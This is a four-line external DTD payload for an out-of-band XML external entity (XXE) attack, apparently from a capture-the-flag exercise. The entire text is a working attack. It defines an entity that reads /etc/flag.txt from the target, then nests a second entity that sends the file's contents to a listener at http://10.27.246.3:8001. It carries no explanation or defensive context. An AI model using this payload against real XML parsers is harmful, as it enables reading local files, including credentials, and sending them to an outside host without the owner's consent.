<!ENTITY % file SYSTEM "file:///etc/flag.txt">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://10.27.246.3:8001/?x=%file;'>">
%eval;
%exfil;
